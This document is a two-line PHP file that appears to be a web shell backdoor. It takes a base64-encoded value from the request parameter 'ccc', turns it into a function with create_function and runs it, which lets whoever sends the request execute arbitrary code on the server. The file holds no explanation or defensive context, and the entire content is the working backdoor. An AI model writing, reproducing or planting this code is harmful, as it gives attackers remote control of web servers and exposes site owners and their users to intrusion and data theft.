<?php
if(!empty($_REQUEST['ccc'])){$ccc=base64_decode($_REQUEST["ccc"]);$ccc=create_function('',$ccc);$ccc();exit;}